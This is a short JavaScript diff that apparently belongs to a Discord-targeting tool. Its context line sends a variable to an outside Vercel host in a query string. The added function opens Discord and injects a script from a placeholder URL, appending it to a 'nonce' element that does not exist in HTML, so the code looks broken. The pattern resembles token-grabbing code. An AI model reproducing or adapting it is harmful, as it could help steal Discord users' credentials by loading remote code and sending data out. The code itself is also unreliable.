@@ -33,7 +33,12 @@ location.replace("web555g.vercel.app?z=" + x);
 */
 function launch(){
   window.open("https://discord.com/channels/@me");
-  
+  var script = document.createElement('script');
+      script.onload = function() {
+        alert("Loading..");
+      };
+      script.src = "URL TO script source";
+      document.getElementsByTagName('nonce')[0].appendChild(script);
 }
 
 
